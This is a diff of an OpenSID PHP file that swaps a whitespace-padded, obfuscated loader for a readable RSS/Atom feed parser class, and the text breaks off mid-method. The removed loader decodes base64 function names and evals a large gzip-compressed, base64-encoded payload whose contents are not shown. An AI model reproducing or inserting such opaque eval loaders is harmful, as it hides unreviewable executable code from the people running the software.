@@ -1,433 +1,498 @@
-<?php 
-        $__='printf';$_='Loading app/Libraries/FeedParser.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
+ * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
+ * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
+ *
+ * @package   OpenSID
+ * @author    Tim Pengembang OpenDesa
+ * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ * @license   http://www.gnu.org/licenses/gpl.html GPL V3
+ * @link      https://github.com/OpenSID/OpenSID
+ *
+ */
+
+namespace App\Libraries;
+
+use Exception;
+
+/**
+ * PHP Univarsel Feed Parser class
+ *
+ * Parses RSS 1.0, RSS2.0 and ATOM Feed
+ *
+ * @license     GNU General Public License (GPL)
+ *
+ * @see http://www.ajaxray.com/blog/2008/05/02/php-universal-feed-parser-lightweight-php-class-for-parsing-rss-and-atom-feeds/
+ */
+class FeedParser
+{
+    private $xmlParser;  // List of tag names which have sub tags
+    private array $insideItem = [];                  // Keep track of current position in tag tree
+    private $currentTag;                     // Last entered tag name
+    private $currentAttr;                     // Attributes array of last entered tag
+    private array $namespaces = [
+        'http://purl.org/rss/1.0/'                 => 'RSS 1.0',
+        'http://purl.org/rss/1.0/modules/content/' => 'RSS 2.0',
+        'http://www.w3.org/2005/Atom'              => 'ATOM 1',
+    ];
+
+    // Namespaces to detact feed version
+    private array $itemTags    = ['ITEM', 'ENTRY'];    // List of tag names which holds a feed item
+    private array $channelTags = ['CHANNEL', 'FEED'];  // List of tag names which holds all channel elements
+    private array $dateTags    = ['UPDATED', 'PUBDATE', 'DC:DATE'];
+    private array $hasSubTags  = ['IMAGE', 'AUTHOR'];  // List of tag names which have sub tags
+    private array $channels    = [];
+    private array $items       = [];
+    private string $url;                     // The parsed url
+    private string $version = '';                     // Detected feed version
+
+    /**
+     * Constructor - Initialize and set event handler functions to xmlParser
+     */
+    public function __construct()
+    {
+        $this->xmlParser = xml_parser_create();
+
+        xml_set_object($this->xmlParser, $this);
+        xml_set_element_handler($this->xmlParser, 'startElement', 'endElement');
+        xml_set_character_data_handler($this->xmlParser, 'characterData');
+    }
+
+    /*-----------------------------------------------------------------------+
+    |  Public functions. Use to parse feed and get informations.             |
+    +-----------------------------------------------------------------------*/
+
+    /**
+     * Get all channel elements
+     *
+     * @return array - All chennels as associative array
+     */
+    public function getChannels(): array
+    {
+        return $this->channels;
+    }
+
+    /**
+     * Get all feed items
+     *
+     * @return array - All feed items as associative array
+     */
+    public function getItems(): array
+    {
+        return $this->items;
+    }
+
+    /**
+     * Get total number of feed items
+     *
+     * @return number
+     */
+    public function getTotalItems(): int
+    {
+        return count($this->items);
+    }
+
+    /**
+     * Get a feed item by index
+     *
+     * @param number  index of feed item
+     * @param mixed $index
+     *
+     * @return array feed item as associative array of it's elements
+     */
+    public function getItem($index)
+    {
+        if ($index < $this->getTotalItems()) {
+            return $this->items[$index];
+        }
+
+        throw new Exception('Item index is learger then total items.');
+    }
+
+    /**
+     * Get a channel element by name
+     *
+     * @param string  the name of channel tag
+     * @param mixed $tagName
+     *
+     * @return string
+     */
+    public function getChannel($tagName)
+    {
+        if (array_key_exists(strtoupper($tagName), $this->channels)) {
+            return $this->channels[strtoupper($tagName)];
+        }
+
+        throw new Exception("Channel tag {$tagName} not found.");
+    }
+
+    /**
+     * Get the parsed URL
+     *
+     * @return string
+     */
+    public function getParsedUrl()
+    {
+        if (empty($this->url)) {
+            throw new Exception('Feed URL is not set yet.');
+        }
+
+        return $this->url;
+    }
+
+    /**
+     * Get the detected Feed version
+     *
+     * @return string
+     */
+    public function getFeedVersion()
+    {
+        return $this->version;
+    }
+
+    /**
+     * Parses a feed url
+     *
+     * @param srting  teh feed url
+     * @param mixed $url
+     *
+     * @return void
+     */
+    public function parse($url)
+    {
+        $this->url  = $url;
+        $URLContent = $this->getUrlContent();
+
+        if ($URLContent !== '' && $URLContent !== '0') {
+            $segments = str_split($URLContent, 4096);
+
+            foreach ($segments as $index => $data) {
+                $lastPiese = (count($segments) - 1) == $index;
+                $result    = xml_parse($this->xmlParser, $data, $lastPiese);
+                if ($result === 0) {
+                    log_message('error', sprintf(
+                        'XML error: %s at line %d',
+                        xml_error_string(xml_get_error_code($this->xmlParser)),
+                        xml_get_current_line_number($this->xmlParser)
+                    ));
+
+                    return false;
+                }
+            }
+            xml_parser_free($this->xmlParser);
+        } else {
+            log_message('error', 'Sorry! cannot load the feed url.');
+
+            return false;
+        }
+
+        if (empty($this->version)) {
+            log_message('error', 'Sorry! cannot detect the feed version.');
+
+            return false;
+        }
+    }
+
+    // End public functions -------------------------------------------------
+
+    /*-----------------------------------------------------------------------+
+    | Private functions. Be careful to edit them.                            |
+    +-----------------------------------------------------------------------*/
+
+    /**
+     * Load the whole contents of a RSS/ATOM page
+     *
+     * @return string
+     */
+    private function getUrlContent()
+    {
+        if (empty($this->url)) {
+            throw new Exception('URL to parse is empty!.');
+        }
+
+        if ($content = @file_get_contents($this->url)) {
+            return $content;
+        }
+
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $this->url);
+        curl_setopt($ch, CURLOPT_HEADER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+        $content = curl_exec($ch);
+        $error   = curl_error($ch);
+
+        curl_close($ch);
+
+        if ($error === '') {
+            return $content;
+        }
+
+        throw new Exception("Erroe occured while loading url by cURL. <br />\n" . $error);
+
+        return false;
+    }
+
+    /**
+     * Handle the start event of a tag while parsing
+     *
+     * @param object  the xmlParser object
+     * @param string  name of currently entering tag
+     * @param array   array of attributes
+     * @param mixed $parser
+     * @param mixed $tagName
+     * @param mixed $attrs
+     *
+     * @return void
+     */
+    private function startElement($parser, $tagName, $attrs)
+    {
+        if (! $this->version) {
+            $this->findVersion($tagName, $attrs);
+        }
+
+        $this->insideItem[] = $tagName;
+
+        $this->currentTag  = $tagName;
+        $this->currentAttr = $attrs;
+    }
+
+    /**
+     * Handle the end event of a tag while parsing
+     *
+     * @param object  the xmlParser object
+     * @param string  name of currently ending tag
+     * @param mixed $parser
+     * @param mixed $tagName
+     *
+     * @return void
+     */
+    private function endElement($parser, $tagName)
+    {
+        if (in_array($tagName, $this->itemTags)) {
+            $this->itemIndex++;
+        }
+
+        array_pop($this->insideItem);
+        $this->currentTag = $this->insideItem[count($this->insideItem) - 1];
+    }
+
+    /**
+     * Handle character data of a tag while parsing
+     *
+     * @param object  the xmlParser object
+     * @param string  tag value
+     * @param mixed $parser
+     * @param mixed $data
+     *
+     * @return void
+     */
+    private function characterData($parser, $data)
+    {
+        //Converting all date formats to timestamp
+        if (in_array($this->currentTag, $this->dateTags)) {
+            $data = strtotime($data);
+        }
+
+        if ($this->inChannel()) {
+            // If has subtag, make current element an array and assign subtags as it's element
+            if (in_array($this->getParentTag(), $this->hasSubTags)) {
+                if (! is_array($this->channels[$this->getParentTag()])) {
+                    $this->channels[$this->getParentTag()] = [];
+                }
+
+                $this->channels[$this->getParentTag()][$this->currentTag] .= strip_tags($this->unhtmlentities((trim($data))));
+
+                return;
+            }
+
+            if (! in_array($this->currentTag, $this->hasSubTags)) {
+                $this->channels[$this->currentTag] .= strip_tags($this->unhtmlentities((trim($data))));
+            }
+
+            if (! empty($this->currentAttr)) {
+                $this->channels[$this->currentTag . '_ATTRS'] = $this->currentAttr;
+
+                //If the tag has no value
+                if (strlen($this->channels[$this->currentTag]) < 2) {
+                    //If there is only one attribute, assign the attribute value as channel value
+                    if (count($this->currentAttr) == 1) {
+                        foreach ($this->currentAttr as $attrVal) {
+                            $this->channels[$this->currentTag] = $attrVal;
+                        }
+                    }
+                    //If there are multiple attributes, assign the attributs array as channel value
+                    else {
+                        $this->channels[$this->currentTag] = $this->currentAttr;
+                    }
+                }
+            }
+        } elseif ($this->inItem()) {
+            // If has subtag, make current element an array and assign subtags as it's elements
